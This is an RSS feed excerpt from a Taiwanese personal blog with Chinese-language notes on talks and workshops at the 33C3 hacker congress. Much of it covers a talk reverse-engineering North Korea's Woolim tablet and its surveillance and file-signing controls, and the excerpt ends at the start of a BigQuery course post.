&lt;p&gt;現場有會眾問她「如果再讓妳選一次，妳會幫忙 Snowden 嗎？」&lt;br /&gt;
她只簡短的回答一句「Yes。」&lt;br /&gt;
全場觀眾立刻爆出如雷的掌聲。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/29/33c3-3"&gt;33C3 (3)&lt;/a&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 04 Feb 2017 20:45:07 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-12-28:posts/2016/12/28/33c3-2/</guid><category>33C3</category><category>Chaos Communication Congress</category><category>CCC</category></item><item><title>33c3 (1)</title><link>https://blog.m157q.tw/posts/2016/12/27/33c3-1/</link><description>&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/27/33c3-0"&gt;33C3 intro&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 1 (2016.12.27 Tue)&lt;/h2&gt;
&lt;h3&gt;Opening&lt;/h3&gt;
&lt;p&gt;約 15 分鐘的開場，&lt;br /&gt;
有興趣的人可以直接看這個影片：&lt;a href="https://media.ccc.de/v/33c3-8429-33c3_opening_ceremony"&gt;https://media.ccc.de/v/33c3-8429-33c3_opening_ceremony&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Opening" src="/files/33c3/opening.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;How do I crack satellite and Cable Pay TV&lt;/h3&gt;
&lt;p&gt;講者很屌得直接 reverse engineering 一台機上盒，&lt;br /&gt;
噢不，講一台好像不是很精確，&lt;br /&gt;
因為講者最後放了張照片，&lt;br /&gt;
他的小貨車後車廂放滿了好幾台這機器。&lt;br /&gt;
期間花了許多時間，&lt;br /&gt;
到完全瞭解機上盒的電路板每個元件到底在做哪些事情，&lt;br /&gt;
最後自己重新焊接電路板上的線路達到目的，&lt;br /&gt;
可以不用付錢直接爽爽看，&lt;br /&gt;
非常精彩。  &lt;/p&gt;
&lt;p&gt;影片在此：&lt;a href="https://media.ccc.de/v/33c3-8127-how_do_i_crack_satellite_and_cable_pay_tv"&gt;https://media.ccc.de/v/33c3-8127-how_do_i_crack_satellite_and_cable_pay_tv&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Lock Picking Workshop&lt;/h3&gt;
&lt;p&gt;&lt;img alt="lock picking workshop poster" src="/files/33c3/lock-picking-workshop.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;身為一個 Hacker，&lt;br /&gt;
其中一項必備技能就是開鎖(Lock Picking)，&lt;br /&gt;
想知道緣由的人可以參考&lt;a href="http://www.books.com.tw/products/0010548392"&gt;博客來-黑客列傳：電腦革命俠客誌(25週年紀念版)&lt;/a&gt;。&lt;br /&gt;
主要就是早期可以用電腦的機會非常少，&lt;br /&gt;
放電腦的機房晚上又會上鎖沒人用，&lt;br /&gt;
一群熱愛電腦的駭客覺得這樣很浪費，&lt;br /&gt;
於是自學開鎖技能把上鎖的機房打開，&lt;br /&gt;
進去裏面偷用電腦。  &lt;/p&gt;
&lt;p&gt;參加之前就有耳聞 CCC 有一個 Lock Picking 的 workshop，&lt;br /&gt;
可以讓你現場練習如何開鎖，&lt;br /&gt;
一直想要瞧瞧看，&lt;br /&gt;
所以聽完第一場演講後就跑來參加了。  &lt;/p&gt;
&lt;p&gt;位置不多，&lt;br /&gt;
但想要參加的人挺多的，&lt;br /&gt;
所以排隊排了一下才等到有位置可以坐。&lt;br /&gt;
現場會有人做簡單的教學，&lt;br /&gt;
拿透明的鎖頭講解鎖頭的基本原理並示範基本的 Raking 跟 Picking 開鎖技巧，&lt;br /&gt;
這些其實在 youtube 搜尋一下就有了，&lt;br /&gt;
但難是難在自己實際操作，&lt;br /&gt;
根據現場教學的人的說法是：「基本上不是用看的，比較像是用聽的和靠感覺的。」  &lt;/p&gt;
&lt;p&gt;&lt;img alt="lock picking" src="/files/33c3/lock-picking.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;一開始我拿了一個挺普通的鎖頭嘗試，&lt;br /&gt;
花了超過半小時的時間都開不了。&lt;br /&gt;
只好放棄然後拿被空出來的透明鎖頭練習，&lt;br /&gt;
能夠順利解鎖透明鎖頭 5 次以後，&lt;br /&gt;
大概掌握到訣竅之後，&lt;br /&gt;
就轉回嘗試不透明的一般鎖頭，&lt;br /&gt;
後來成功開啟了兩個，&lt;br /&gt;
從頭到尾從坐下到離開大概花了兩個小時吧，&lt;br /&gt;
現場還有些難度較高且種類不同的鎖頭我沒時間嘗試。  &lt;/p&gt;
&lt;p&gt;Workshop 現場就有在販賣開鎖工具組，&lt;br /&gt;
最便宜的一組要價是 15 歐，&lt;br /&gt;
之後比較貴的就是工具多一點然後加上個皮套件的包裝這樣，&lt;br /&gt;
我覺得挺有趣的，&lt;br /&gt;
所以就買了最便宜的 15 歐那組。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Untrusting of CPU: A proposal for secure computing in an age where we cannot trust our CPUs anymore&lt;/h3&gt;
&lt;p&gt;這場演講主要就是在講說他設計了一個系統可以增加電腦計算的可靠性與安全性，&lt;br /&gt;
但前面主要都是在講說到底電腦有哪些缺陷造成其不可靠性及不安全性，&lt;br /&gt;
但我聽起來是挺枯燥的，&lt;br /&gt;
講了半個小時大概都沒有講到重點，&lt;br /&gt;
期間也有不少人相繼離席，&lt;br /&gt;
後來我也覺得沒什麼收穫，&lt;br /&gt;
所以也在中途離開去逛社群攤位了。  &lt;/p&gt;
&lt;p&gt;有興趣的人一樣可以參考影片： &lt;a href="https://media.ccc.de/v/33c3-8014-untrusting_the_cpu"&gt;https://media.ccc.de/v/33c3-8014-untrusting_the_cpu&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;逛攤位&lt;/h3&gt;
&lt;p&gt;CCC 把他們的社群稱為 Assembly 而不是 Community，&lt;br /&gt;
就是一群人組合在一起的意思嘛。  &lt;/p&gt;
&lt;p&gt;現場有非常多各式各樣的社群，&lt;br /&gt;
除了開鎖的以外，&lt;br /&gt;
還有 VR、互動裝置、焊接、電子看板、3D 列印、雷射雕刻、無線電、嵌入式裝置...等等，&lt;br /&gt;
也有程式語言相關的 Rust, Python, Ruby，&lt;br /&gt;
現場甚至有個傢伙在使用 &lt;a href="https://en.wikipedia.org/wiki/Commodore_64"&gt;Commodore 64&lt;/a&gt;。&lt;br /&gt;
還有很多一直盯著 IBM ThinkPad 螢幕不斷飛快敲打鍵盤的傢伙，&lt;br /&gt;
但你不知道他們在幹嘛就是。&lt;br /&gt;
會場到處都可以看到有人席地而坐，&lt;br /&gt;
然後就開始 coding 或開始討論程式碼，&lt;br /&gt;
當然也有很多人是聊各式各樣和資訊相關的議題與技術就是。  &lt;/p&gt;
&lt;p&gt;這部份在最後一篇的總結會再描述的詳細些。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Woolim - Lifting the Fog on DPRK's Latest Tablet PC&lt;/h3&gt;
&lt;p&gt;這個應該是我第一天聽到最酷的議程了，&lt;br /&gt;
講的是他們透過了一些特殊管道拿到了一台北韓政府發給北韓人民使用的平板電腦，&lt;br /&gt;
然後他們透過哪些方法去逆向工程這台平板，&lt;br /&gt;
發現了哪些有趣的東西，&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;這個平板其實是中國製造的。  &lt;ul&gt;
&lt;li&gt;所以裏面有 Google 拼音輸入法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個平板會在使用者每次開啟 App 的時候都做截圖，然後把截圖送到北韓官方的伺服器。  &lt;ul&gt;
&lt;li&gt;他們有去 trace 往哪邊送，但發現 IP 基本上都是使用內網 IP。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個平板產生的檔案無法分享給其他同款平板的使用者，也無法分享給其他北韓的電子裝置，也無法接收來自其他國家的檔案。  &lt;ul&gt;
&lt;li&gt;他們去研究其加密及如何實作的機制  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;甚至還拿到了這個平板的廣告影片，&lt;br /&gt;
現場就播放了這個廣告影片給大家看，&lt;br /&gt;
廣告影片的時間挺長的，&lt;br /&gt;
我估計大概有 5 分鐘吧，&lt;br /&gt;
廣告的內容就在講說這個平板有哪些功能，&lt;br /&gt;
然後畫面很像台灣七零年代的感覺。  &lt;/p&gt;
&lt;p&gt;影片在此 &lt;a href="https://media.ccc.de/v/33c3-8143-woolim_lifting_the_fog_on_dprk_s_latest_tablet_pc"&gt;https://media.ccc.de/v/33c3-8143-woolim_lifting_the_fog_on_dprk_s_latest_tablet_pc&lt;/a&gt;  &lt;/p&gt;
&lt;h4&gt;Woolim&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Name of waterfall in DPRK  &lt;/li&gt;
&lt;li&gt;One of probably 4 Tablet PCs from DPRKs  &lt;/li&gt;
&lt;li&gt;Manufacturer  &lt;ul&gt;
&lt;li&gt;Hoozo in China  &lt;/li&gt;
&lt;li&gt;Z100  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SImilar products sell for ~180 EUR to ~260 EUR  &lt;/li&gt;
&lt;li&gt;Software from/modified by DPRK  &lt;/li&gt;
&lt;li&gt;南韓朋友幫忙拿到 Woolim 在北韓的廣告影片，現場播放。  &lt;ul&gt;
&lt;li&gt;背景音樂也太熱血 XDDD  &lt;/li&gt;
&lt;li&gt;廣告超級久啊，大概快五分鐘了吧。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Don't drive and watch TV (XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;Free Warranty service  &lt;/li&gt;
&lt;li&gt;Remember RedStar AV (Anti-virus)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Hardware&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;System Information  &lt;ul&gt;
&lt;li&gt;Allwinner A33 [ARMv7] SoC  &lt;/li&gt;
&lt;li&gt;8GB SK Hynix flash  &lt;/li&gt;
&lt;li&gt;MicroSD and power plug  &lt;/li&gt;
&lt;li&gt;Not so responsive touchscreen  &lt;/li&gt;
&lt;li&gt;no communication interfaces  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;USB peripherals available  &lt;ul&gt;
&lt;li&gt;Modem  &lt;/li&gt;
&lt;li&gt;WiFi  &lt;/li&gt;
&lt;li&gt;LAN  &lt;/li&gt;
&lt;li&gt;DVB-T  &lt;/li&gt;
&lt;li&gt;HDMI [?]  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Software&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Android 4.4.2  &lt;/li&gt;
&lt;li&gt;Kernel 3.4.39  &lt;/li&gt;
&lt;li&gt;Build: Sep 10, 2015  &lt;/li&gt;
&lt;li&gt;Preinstalled applications  &lt;ul&gt;
&lt;li&gt;Camera  &lt;/li&gt;
&lt;li&gt;"Education"  &lt;/li&gt;
&lt;li&gt;Games  &lt;/li&gt;
&lt;li&gt;Browser  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Built-in apps  &lt;ul&gt;
&lt;li&gt;谷歌拼音輸入法  &lt;/li&gt;
&lt;li&gt;Flash  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;Microsoft Office  &lt;/li&gt;
&lt;li&gt;ODF  &lt;/li&gt;
&lt;li&gt;有個類似 SimCity 的 App，可以畫房屋的建築圖。  &lt;/li&gt;
&lt;li&gt;Cooking Application  &lt;/li&gt;
&lt;li&gt;TraceViewer  &lt;ul&gt;
&lt;li&gt;Took pictures whenever you open the app and send to server.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Internal Storage  &lt;ul&gt;
&lt;li&gt;無法開啟外來的檔案，會顯示：It is not signed file.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Application Demos&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;NAC  &lt;ul&gt;
&lt;li&gt;Probably used for a access to Kwangmyong  &lt;/li&gt;
&lt;li&gt;PANA / PPPoE / Dialup  &lt;/li&gt;
&lt;li&gt;Login credentials  &lt;/li&gt;
&lt;li&gt;Different access points for different groups  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Red Flag  &lt;ul&gt;
&lt;li&gt;Schedules thread  &lt;/li&gt;
&lt;li&gt;Takes screenshots in the background  &lt;/li&gt;
&lt;li&gt;Logs the Browser history  &lt;/li&gt;
&lt;li&gt;Get IMEI, IMSI and &lt;code&gt;android_id&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Copies key material  &lt;/li&gt;
&lt;li&gt;"Integrity Check" for files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Gaining Access&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;They really lock the tablet excellently.  &lt;/li&gt;
&lt;li&gt;The obvious things  &lt;ul&gt;
&lt;li&gt;ADB enabled? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Can we enable it? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Developer options? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Can we install APKs? =&amp;gt; NO  &lt;/li&gt;
&lt;li&gt;Is there a recovery/reset mode? =&amp;gt; NO  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The more advanced things  &lt;ul&gt;
&lt;li&gt;File open dialogs in Apps  &lt;/li&gt;
&lt;li&gt;Attacks via archives  &lt;ul&gt;
&lt;li&gt;Symlinks  &lt;/li&gt;
&lt;li&gt;Directory Traversal  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Suspicious shell commands in configuration files  &lt;/li&gt;
&lt;li&gt;Java Deserialization for Tetris  &lt;ul&gt;
&lt;li&gt;Wrote by a Chinese guy  &lt;/li&gt;
&lt;li&gt;Got the source code  &lt;/li&gt;
&lt;li&gt;Serialize Java object into SD card  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flash application  &lt;/li&gt;
&lt;li&gt;XLS macro injections  &lt;/li&gt;
&lt;li&gt;even more...  &lt;/li&gt;
&lt;li&gt;None of these works  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exploits? Vulnerabilities?  &lt;/li&gt;
&lt;li&gt;Avoid Hardware Tampering  &lt;/li&gt;
&lt;li&gt;Might find a way  &lt;ul&gt;
&lt;li&gt;PhoenixCard  &lt;ul&gt;
&lt;li&gt;Create Bootable Images for Allwinner Devices  &lt;/li&gt;
&lt;li&gt;Put this SD card in and it actually worked.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;After the bootable SD card worked.  &lt;ul&gt;
&lt;li&gt;Linux kernel, but no way to access memory.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What to do next?  &lt;ul&gt;
&lt;li&gt;Test Environment  &lt;ul&gt;
&lt;li&gt;Cheap (about 30 bucks) A33 Tablet with similar functionality  &lt;/li&gt;
&lt;li&gt;It worked and dumped out the storage layout.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Distribution of Media files in DPRK: Achieving absolute control&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Multiple Ways of Tracing Media Distribution  &lt;ul&gt;
&lt;li&gt;Watermarking introduced in Red Star OS  &lt;ul&gt;
&lt;li&gt;Append simple watermarks to media files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compatible code available on Woolim  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Red Star OS Watermarking Recap  &lt;ul&gt;
&lt;li&gt;Plaintext: WMB48Z789B3AZ97  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;takeshixx/redstar-tools&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tracking the Distribution of Media Files  &lt;ul&gt;
&lt;li&gt;Create social networks  &lt;/li&gt;
&lt;li&gt;Construct connections between dissidents  &lt;/li&gt;
&lt;li&gt;Track down sources  &lt;/li&gt;
&lt;li&gt;Shutdown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Woolim is More Restrictive than Red Star OS  &lt;ul&gt;
&lt;li&gt;Introduces file signatures  &lt;ul&gt;
&lt;li&gt;Using asymmetric cryptography [RSA]  &lt;/li&gt;
&lt;li&gt;Goal: PREVENT the distribution of media files  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Government has full control over signatures  &lt;ul&gt;
&lt;li&gt;Absolute control over media sources  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Signature Checking  &lt;ul&gt;
&lt;li&gt;Java interface with native JNI library [gov.no.media.Sign]  &lt;ul&gt;
&lt;li&gt;Called by apps e.g. during file opening/saving  &lt;/li&gt;
&lt;li&gt;Sometimes concealed as "License checks"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multiple ways of signing  &lt;ul&gt;
&lt;li&gt;NATSIGN  &lt;/li&gt;
&lt;li&gt;SELFSIGN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Files without proper signatures are forbidden.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Java Native Interface Libraries  &lt;ul&gt;
&lt;li&gt;Check if file has a proper signature  &lt;/li&gt;
&lt;li&gt;Used by various applications, e.g.:  &lt;ul&gt;
&lt;li&gt;FileBrowser.apk  &lt;/li&gt;
&lt;li&gt;Gallery2.apk  &lt;/li&gt;
&lt;li&gt;Music.apk  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NATSIGN  &lt;ul&gt;
&lt;li&gt;Files that have been approved by the government  &lt;ul&gt;
&lt;li&gt;Also referred to as "gov_sign"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Files are signed with a 2048 bit RSA key  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SELFSIGN  &lt;ul&gt;
&lt;li&gt;Combination of  &lt;ul&gt;
&lt;li&gt;Symmetric encryption [Rijndael 256]  &lt;/li&gt;
&lt;li&gt;Asymmetric signatures [RSA]  &lt;/li&gt;
&lt;li&gt;Hashing [SHA224/SHA256]  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Device identity stored in &lt;code&gt;/data/local/tmp/legalref.dat&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Comprised of IMEI and IMSI  &lt;/li&gt;
&lt;li&gt;Each device's... legal reference  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Files created on the device itself can be opened  &lt;ul&gt;
&lt;li&gt;Camera images, office documents, PDFs, etc.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Signatures  &lt;ul&gt;
&lt;li&gt;RSA signature of file hash  &lt;/li&gt;
&lt;li&gt;Encrypted device identity  &lt;ul&gt;
&lt;li&gt;Rijndael 256 (key and blocks)  &lt;/li&gt;
&lt;li&gt;IMEI and IMSI  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Trailer  &lt;ul&gt;
&lt;li&gt;Signature size  &lt;/li&gt;
&lt;li&gt;ASCII suffix "SELFSIGN"  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FIxed size of 792 bytes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;File types affected by signing  &lt;ul&gt;
&lt;li&gt;All kinds of media files  &lt;/li&gt;
&lt;li&gt;Text and HTML files  &lt;/li&gt;
&lt;li&gt;Even APKs...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h6&gt;Absolute Control of Woolim's Media Sources&lt;/h6&gt;
&lt;ul&gt;
&lt;li&gt;NATSIGN  &lt;ul&gt;
&lt;li&gt;Approved by the government  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SELFSIGN  &lt;ul&gt;
&lt;li&gt;Created on the device itself  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Can not be shared to  &lt;ul&gt;
&lt;li&gt;Other Woolim tablet PCs  &lt;/li&gt;
&lt;li&gt;Other devices in DPRK  &lt;/li&gt;
&lt;li&gt;Rest of World  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Supporters&lt;/h5&gt;
&lt;p&gt;ISFINK  &lt;/p&gt;
&lt;h5&gt;Future Work&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Free some of the stuff from the tablet  &lt;ul&gt;
&lt;li&gt;Dictionaries  &lt;/li&gt;
&lt;li&gt;Books  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Q&amp;amp;A&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;OS occupied about 1GB on Woolim  &lt;/li&gt;
&lt;li&gt;Won't provice the dump of this device because it may put the owner of this device in danger.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;補充&lt;/h4&gt;
&lt;p&gt;對北韓有興趣的人，&lt;br /&gt;
可以參考壹電視新聞台的陳雅琳記者於 2016 年進入北韓的報導，&lt;br /&gt;
個人覺得搭配這個演講看應該會挺有趣的。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=aQOLW5gnca0"&gt;「探祕北韓」特別報導（上集） - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=m8iVmdc3kqc"&gt;「探祕北韓」特別報導（下集） - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/28/33c3-2"&gt;33C3 (2)&lt;/a&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 04 Feb 2017 20:45:07 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-12-27:posts/2016/12/27/33c3-1/</guid><category>33C3</category><category>Chaos Communication Congress</category><category>CCC</category></item><item><title>33c3 intro</title><link>https://blog.m157q.tw/posts/2016/12/27/33c3-0/</link><description>&lt;p&gt;&lt;img alt="light logo of 33C3 on the building" src="/files/33c3/light-logo.jpg" /&gt;&lt;br /&gt;
（主辦單位直接在隔壁的飯店大樓打上了代表這次主題的燈光。照片逆時鐘旋轉了 90 度。）  &lt;/p&gt;
&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;先科普一下，&lt;br /&gt;
以下的駭客 (Hacker) 指的都是原本的定義：「對某種技術極度熱愛且掌握程度非常專精的人」，&lt;br /&gt;
而不是後來被世人誤用的：「專門利用電腦網路搞破壞或是竊取他人資料的人」，&lt;br /&gt;
後者的正確名稱應該是 Cracker 而不是 Hacker，&lt;br /&gt;
當然，&lt;br /&gt;
不排除 Hacker 裏面也有心術不正者，&lt;br /&gt;
進而利用其專精的技術搞破壞的 Cracker 或是 Black/Gray Hat 存在就是。  &lt;/p&gt;
&lt;p&gt;進入正題，&lt;br /&gt;
33C3 其實是 33rd Chaos Communication Congress 的簡稱，&lt;br /&gt;
硬要用中文翻的話就是「第三十三屆混亂通訊大會」，&lt;br /&gt;
不過個人覺得這個翻譯太不到位也太長了，&lt;br /&gt;
然後以下的稱呼直接省略屆數，&lt;br /&gt;
稱呼為 CCC。  &lt;/p&gt;
&lt;p&gt;首先，&lt;br /&gt;
這是一個駭客年會，&lt;br /&gt;
在西元 2016 年舉辦了第 33 屆，&lt;br /&gt;
所以稍微推算一下，&lt;br /&gt;
第 1 屆舉辦的時間是在 1984 年，&lt;br /&gt;
在德國的漢堡 (Hamburg) 舉辦，&lt;br /&gt;
1998 年改成在德國的柏林 (Berlin) 舉辦，&lt;br /&gt;
2012 年又改回在 Hamburg 舉辦，&lt;br /&gt;
每屆都是在年底的時候舉辦。&lt;br /&gt;
2016 年的年會會場也是在 Hamburg，&lt;br /&gt;
地點則是漢堡會議中心（Congress Center Hamburg，簡稱 CCH)，&lt;br /&gt;
主辦方在會議期間就很乾脆的把 CCH 這棟建築的標誌中的 H 用一個 C 蓋掉，&lt;br /&gt;
順理成章的當成自己的。  &lt;/p&gt;
&lt;p&gt;CCC 目前已經是歐洲規模最大的駭客年會了，&lt;br /&gt;
2015 年約有 13,000 人參加，&lt;br /&gt;
2016 年則約有 15,000 人參加。&lt;br /&gt;
而會議的議題主要圍繞於和資訊安全、個人隱私、網路自由相關的技術性或者政治性議題，&lt;br /&gt;
再加上各式各樣的社群所舉辦的 workshop 或 self-host session，&lt;br /&gt;
還有其他一言難盡的項目&lt;br /&gt;
（例如：CTF, 現場談話性節目，Speaker's Sofa, 有人自幹的作品帶來現場 demo, 酒吧, 有 DJ 的 Lounge bar, ... 等等）所組成。&lt;br /&gt;
想瞭解一下這個歐洲最大的年度駭客會議可以參考一下&lt;a href="https://en.wikipedia.org/wiki/Chaos_Communication_Congress"&gt;維基百科的介紹&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;CCC 的主辦方是 &lt;a href="http://www.ccc.de/en/?language=en"&gt;Chaos Computer Club&lt;/a&gt;，&lt;br /&gt;
簡稱也叫 CCC，&lt;br /&gt;
成立於 1981 年，&lt;br /&gt;
主要根據地及參與者都在德國，&lt;br /&gt;
是歐洲最大的駭客組織，&lt;br /&gt;
想瞭解更多的話可以參考&lt;a href="https://en.wikipedia.org/wiki/Chaos_Computer_Club"&gt;維基百科的介紹&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;至於為什麼會來參加這個全歐洲最大的年度駭客會議 Chaos Communication Congress，&lt;br /&gt;
想知道的人請參考&lt;a href="/posts/2016/12/20/33c3-暨歐洲法荷德聖誕跨年遊-0"&gt;另外一篇文章的前言&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;以下會有兩個部份，&lt;br /&gt;
其一為我參加了四天會議(2016/12/27~30)的紀錄，總共分為 4 篇。&lt;br /&gt;
其二為我對這次參加 CCC 的總結，包含我看到的東西與想法，紀錄在這系列的第 5 篇。  &lt;/p&gt;
&lt;p&gt;然後因為大會有規定拍照的時候，&lt;br /&gt;
必須確認所有會入鏡的人都願意入鏡才可以拍攝，&lt;br /&gt;
基本上就是不鼓勵你隨便拍別人的意思，&lt;br /&gt;
所以接下來看到我拍的照片基本上都不會有人入鏡。&lt;br /&gt;
（就算有的話也會是背影或是非常模糊啦，先打預防針 XD）  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Ask before taking photo" src="/files/33c3/ask-before-taking-photo.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/27/33c3-1"&gt;33C3 (1)&lt;/a&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Mon, 23 Jan 2017 23:25:07 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-12-27:posts/2016/12/27/33c3-0/</guid><category>33C3</category><category>Chaos Communication Congress</category><category>CCC</category></item><item><title>CPB200: BigQuery for Data Analysts</title><link>https://blog.m157q.tw/posts/2016/12/15/cpb200-bigquery-for-data-analysts/</link><description>&lt;h1&gt;課程資訊&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://myclass.gcptrain.org/"&gt;http://myclass.gcptrain.org/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;azkyY21yCg==  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cpb200-bigquery-for-data-analysts"&gt;https://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/cpb200-bigquery-for-data-analysts&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/files/cpb200-bigquery-for-data-analysts/CPB200.zip"&gt;slides&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google 系列課程  &lt;ul&gt;
&lt;li&gt;CP100: 介紹性質，廣而淺，新手課程。  &lt;/li&gt;
&lt;li&gt;CP200: 開始針對單一技術做比較深的介紹。  &lt;/li&gt;
&lt;li&gt;CP300: 五個全天的課程，上完之後一個月內通過線上考試可以拿到 CP300 證照。  &lt;/li&gt;
